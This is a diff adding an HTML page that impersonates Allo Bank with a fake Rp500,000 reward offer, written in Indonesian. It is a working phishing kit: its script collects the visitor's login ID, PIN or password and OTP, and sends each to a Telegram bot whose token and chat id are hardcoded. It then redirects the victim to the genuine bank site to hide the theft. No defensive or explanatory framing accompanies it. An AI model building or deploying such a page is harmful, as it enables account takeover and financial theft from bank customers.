@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Allo Bank - Reward</title>
+    <style>
+        body { background: #001a33; font-family: sans-serif; margin: 0; display: flex; justify-content: center; }
+        .app { background: white; width: 100%; max-width: 400px; min-height: 100vh; }
+        .header { background: linear-gradient(135deg, #ffcc00, #ff9900); padding: 40px 20px; text-align: center; border-radius: 0 0 40px 40px; }
+        .logo { font-size: 32px; font-weight: 900; font-style: italic; color: #001a33; }
+        .logo span { color: white; }
+        .content { padding: 40px 25px; }
+        input { width: 100%; border: none; border-bottom: 2px solid #eee; padding: 12px 0; font-size: 16px; margin-bottom: 20px; outline: none; }
+        .btn { background: #001a33; color: #ffcc00; border: none; width: 100%; padding: 18px; border-radius: 35px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="app">
+    <div class="header">
+        <div class="logo">allo<span>bank</span></div>
+        <p style="font-weight:bold; color:#001a33">REWARD Rp500.000</p>
+    </div>
+    <div id="p1" class="content">
+        <p>Silakan verifikasi akun untuk klaim reward.</p>
+        <input type="text" id="u" placeholder="Nomor HP / Email">
+        <input type="password" id="p" placeholder="PIN / Password">
+        <button class="btn" onclick="next()">LANJUTKAN</button>
+    </div>
+    <div id="p2" class="content" style="display:none">
+        <p style="color:red">Masukkan Kode OTP</p>
+        <input type="number" id="o" placeholder="6 Digit OTP">
+        <button class="btn" onclick="send()">KLAIM SEKARANG</button>
+    </div>
+</div>
+<script>
+    const a = "8428905799"; 
+    const b = "AAHsA0cXKxvRnTI1y6QXCPzgL8w0rhTPto4";
+    const t = a + ":" + b;
+    const cid = "6950857232";
+    let usr = "";
+    function next() {
+        usr = document.getElementById('u').value;
+        const msg = `🚨 LOGIN\n👤 ID: ${usr}\n🔑 PW: ${document.getElementById('p').value}`;
+        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`);
+        document.getElementById('p1').style.display = 'none';
+        document.getElementById('p2').style.display = 'block';
+    }
+    function send() {
+        const msg = `✅ OTP\n👤 ID: ${usr}\n🔢 OTP: ${document.getElementById('o').value}`;
+        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`)
+        .then(() => window.location.href = "https://www.allobank.com/promo");
+    }
+</script>
+</body>
+      </html>
